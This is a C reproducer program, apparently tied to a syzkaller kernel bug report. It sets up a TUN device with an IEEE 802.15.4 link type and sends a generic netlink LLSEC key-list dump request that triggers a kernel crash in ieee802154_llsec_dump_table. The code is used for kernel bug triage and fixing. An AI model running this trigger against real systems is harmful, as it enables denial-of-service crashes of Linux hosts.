// https://syzkaller.appspot.com/bug?id=759a5fda55f8417d5c819990d395826d2ef40103
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <linux/netlink.h>
#include <linux/genetlink.h>
#include <linux/if.h>
#include <linux/if_tun.h>
#include <linux/if_arp.h>

#ifndef ARPHRD_IEEE802154
#define ARPHRD_IEEE802154 804
#endif

#ifndef IEEE802154_LLSEC_LIST_KEY
#define IEEE802154_LLSEC_LIST_KEY 38
#endif

#define IEEE802154_NL_NAME "802.15.4 MAC"

int main(void)
{
    setvbuf(stdout, NULL, _IONBF, 0);
    printf("[*] Starting Phase 2 reproducer for ieee802154_llsec_dump_table GPF...\n");

    /* Step 1: Create a TUN interface and change its link type to ARPHRD_IEEE802154 */
    int tun_fd = open("/dev/net/tun", O_RDWR);
    if (tun_fd < 0) {
        printf("[-] Failed to open /dev/net/tun: %s\n", strerror(errno));
        exit(1);
    }
    printf("[+] Successfully opened /dev/net/tun.\n");

    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    ifr.ifr_flags = IFF_TUN | IFF_NO_PI;
    strncpy(ifr.ifr_name, "tun%d", IFNAMSIZ - 1);

    int res = ioctl(tun_fd, TUNSETIFF, &ifr);
    if (res < 0) {
        printf("[-] Failed to ioctl TUNSETIFF: %s\n", strerror(errno));
        close(tun_fd);
        exit(1);
    }
    printf("[+] Successfully created TUN interface '%s'.\n", ifr.ifr_name);

    res = ioctl(tun_fd, TUNSETLINK, ARPHRD_IEEE802154);
    if (res < 0) {
        printf("[-] Failed to set TUN link type to ARPHRD_IEEE802154: %s\n", strerror(errno));
        close(tun_fd);
        exit(1);
    }
    printf("[+] Successfully set TUN link type to ARPHRD_IEEE802154.\n");

    /* Step 2: Open NETLINK_GENERIC socket and resolve '802.15.4 MAC' family ID */
    int nl_fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_GENERIC);
    if (nl_fd < 0) {
        printf("[-] Failed to open NETLINK_GENERIC socket: %s\n", strerror(errno));
        close(tun_fd);
        exit(1);
    }
    printf("[+] Successfully opened NETLINK_GENERIC socket.\n");

    struct {
        struct nlmsghdr n;
        struct genlmsghdr g;
        char buf[256];
    } fam_req;
    memset(&fam_req, 0, sizeof(fam_req));

    fam_req.n.nlmsg_len = NLMSG_LENGTH(GENL_HDRLEN);
    fam_req.n.nlmsg_flags = NLM_F_REQUEST;
    fam_req.n.nlmsg_type = GENL_ID_CTRL;
    fam_req.n.nlmsg_seq = 1;
    fam_req.n.nlmsg_pid = getpid();
    fam_req.g.cmd = CTRL_CMD_GETFAMILY;
    fam_req.g.version = 1;

    const char *fam_name = IEEE802154_NL_NAME;
    int fam_name_len = strlen(fam_name) + 1;
    struct nlattr *na = (struct nlattr *)((char *)&fam_req + fam_req.n.nlmsg_len);
    na->nla_type = CTRL_ATTR_FAMILY_NAME;
    na->nla_len = NLA_HDRLEN + fam_name_len;
    memcpy((char *)na + NLA_HDRLEN, fam_name, fam_name_len);
    fam_req.n.nlmsg_len = NLMSG_ALIGN(fam_req.n.nlmsg_len + na->nla_len);

    ssize_t sent = send(nl_fd, &fam_req, fam_req.n.nlmsg_len, 0);
    if (sent < 0) {
        printf("[-] Failed to send CTRL_CMD_GETFAMILY request: %s\n", strerror(errno));
        close(nl_fd);
        close(tun_fd);
        exit(1);
    }
    printf("[+] Sent CTRL_CMD_GETFAMILY query for family '%s'.\n", IEEE802154_NL_NAME);

    char recv_buf[4096];
    ssize_t received = recv(nl_fd, recv_buf, sizeof(recv_buf), 0);
    if (received < 0) {
        printf("[-] Failed to receive generic netlink reply: %s\n", strerror(errno));
        close(nl_fd);
        close(tun_fd);
        exit(1);
    }
    printf("[+] Received generic netlink reply (%zd bytes).\n", received);

    struct nlmsghdr *nlh = (struct nlmsghdr *)recv_buf;
    if (!NLMSG_OK(nlh, (size_t)received)) {
        printf("[-] Received malformed netlink message\n");
        close(nl_fd);
        close(tun_fd);
        exit(1);
    }

    if (nlh->nlmsg_type == NLMSG_ERROR) {
        struct nlmsgerr *err = (struct nlmsgerr *)NLMSG_DATA(nlh);
        printf("[-] Generic netlink family query error: %d (%s)\n",
               err->error, strerror(-err->error));
        close(nl_fd);
        close(tun_fd);
        exit(1);
    }

    struct genlmsghdr *ghdr = (struct genlmsghdr *)NLMSG_DATA(nlh);
    int attr_bytes = nlh->nlmsg_len - NLMSG_HDRLEN - GENL_HDRLEN;
    struct nlattr *attr = (struct nlattr *)((char *)ghdr + GENL_HDRLEN);
    uint16_t family_id = 0;

    while (attr_bytes >= (int)sizeof(struct nlattr) &&
           attr->nla_len >= sizeof(struct nlattr) &&
           attr->nla_len <= attr_bytes) {
        if (attr->nla_type == CTRL_ATTR_FAMILY_ID) {
            family_id = *(uint16_t *)((char *)attr + NLA_HDRLEN);
            break;
        }
        int len = NLA_ALIGN(attr->nla_len);
        attr_bytes -= len;
        attr = (struct nlattr *)((char *)attr + len);
    }

    if (family_id == 0) {
        printf("[-] Family ID not found in reply for '%s'\n", IEEE802154_NL_NAME);
        close(nl_fd);
        close(tun_fd);
        exit(1);
    }
    printf("[+] Successfully resolved '%s' family ID: %u\n", IEEE802154_NL_NAME, family_id);

    /* Step 3: Trigger crash via IEEE802154_LLSEC_LIST_KEY dump request */
    printf("[*] Sending IEEE802154_LLSEC_LIST_KEY dump request...\n");
    struct {
        struct nlmsghdr n;
        struct genlmsghdr g;
    } dump_req;
    memset(&dump_req, 0, sizeof(dump_req));

    dump_req.n.nlmsg_len = NLMSG_LENGTH(GENL_HDRLEN);
    dump_req.n.nlmsg_flags = NLM_F_REQUEST | NLM_F_DUMP;
    dump_req.n.nlmsg_type = family_id;
    dump_req.n.nlmsg_seq = 2;
    dump_req.n.nlmsg_pid = getpid();
    dump_req.g.cmd = IEEE802154_LLSEC_LIST_KEY;
    dump_req.g.version = 1;

    sent = send(nl_fd, &dump_req, dump_req.n.nlmsg_len, 0);
    if (sent < 0) {
        printf("[-] Failed to send IEEE802154_LLSEC_LIST_KEY dump request: %s\n", strerror(errno));
        close(nl_fd);
        close(tun_fd);
        exit(1);
    }
    printf("[+] LLSEC dump request sent successfully.\n");

    /* Attempt to receive reply in case dump executes asynchronously */
    received = recv(nl_fd, recv_buf, sizeof(recv_buf), 0);
    if (received < 0) {
        printf("[-] Failed to receive dump reply: %s\n", strerror(errno));
    } else {
        printf("[+] Received %zd bytes from dump reply.\n", received);
    }

    close(nl_fd);
    close(tun_fd);
    printf("[+] Program completed.\n");
    return 0;
}
